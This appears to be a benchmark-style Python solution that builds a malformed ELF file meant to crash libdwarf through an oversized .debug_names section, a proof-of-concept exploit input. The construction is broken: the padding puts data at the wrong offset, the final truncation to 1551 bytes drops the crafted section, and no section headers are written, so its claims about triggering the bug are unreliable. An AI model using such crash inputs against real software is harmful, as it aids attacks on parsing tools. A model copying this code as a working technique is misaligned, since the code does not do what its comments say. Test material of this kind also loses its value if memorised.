import struct
import os
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid ELF header for x86-64
        elf_header = bytearray(64)
        
        # ELF magic
        elf_header[0:4] = b'\x7fELF'
        elf_header[4] = 2  # 64-bit
        elf_header[5] = 1  # Little endian
        elf_header[6] = 1  # ELF version
        elf_header[7] = 0  # OS ABI
        elf_header[16:18] = struct.pack('<H', 2)  # ET_EXEC
        elf_header[18:20] = struct.pack('<H', 0x3e)  # x86-64
        elf_header[20:24] = struct.pack('<I', 1)  # ELF version
        elf_header[40:48] = struct.pack('<Q', 64)  # e_phoff (program header offset)
        elf_header[48:50] = struct.pack('<H', 64)  # e_ehsize
        elf_header[54:56] = struct.pack('<H', 56)  # e_phentsize
        elf_header[56:58] = struct.pack('<H', 2)  # e_phnum
        
        # Create program headers
        phdrs = bytearray()
        
        # First PHDR: PT_LOAD for code
        phdrs += struct.pack('<IIQQQQ', 1, 5, 0, 0x400000, 0x400000, 0x1000)
        
        # Second PHDR: PT_LOAD for data (where debug sections go)
        phdrs += struct.pack('<IIQQQQ', 1, 6, 0x2000, 0x402000, 0x402000, 0x1000)
        
        # Create minimal .debug_names section that triggers the vulnerability
        # Based on libdwarf issue: incorrect bounds checking in dwarf_debugnames.c
        debug_names = bytearray()
        
        # Unit length (64-bit format)
        debug_names += b'\xff\xff\xff\xff'  # Extended length indicator
        debug_names += struct.pack('<Q', 0x7fffffff)  # Very large length
        
        # Version
        debug_names += struct.pack('<H', 5)  # DWARF5
        
        # Padding
        debug_names += b'\x00\x00'
        
        # compilation_unit_count, local_type_unit_count, foreign_type_unit_count
        debug_names += struct.pack('<III', 1, 0, 0)
        
        # bucket_count - large value that will cause overflow
        debug_names += struct.pack('<I', 0x3fffffff)
        
        # name_count
        debug_names += struct.pack('<I', 1)
        
        # abbreviation_table_size
        debug_names += struct.pack('<I', 100)
        
        # augmentation_string_size
        debug_names += struct.pack('<I', 0)
        
        # Buckets array - minimal data
        debug_names += b'\x00' * 4
        
        # Hash values array - minimal data
        debug_names += b'\x00' * 4
        
        # Name table entries
        # Single entry with offset that points beyond allocated buffer
        debug_names += struct.pack('<I', 0xfffffffe)  # index
        debug_names += struct.pack('<I', 0)  # offset
        
        # Abbreviation table - minimal valid content
        debug_names += b'\x01'  # Entry code
        debug_names += b'test\x00'  # Tag name
        debug_names += b'\x00'  # Null terminator for table
        
        # Pad to trigger overflow when reading
        remaining = 1551 - len(elf_header) - len(phdrs) - len(debug_names)
        if remaining > 0:
            debug_names += b'A' * remaining
        
        # Construct final ELF
        elf = elf_header + phdrs
        
        # Add padding to align debug_names section
        current_len = len(elf)
        pad_len = (0x2000 - current_len) % 0x1000
        elf += b'\x00' * pad_len
        
        # Add debug_names at offset 0x2000
        elf += debug_names
        
        return bytes(elf[:1551])
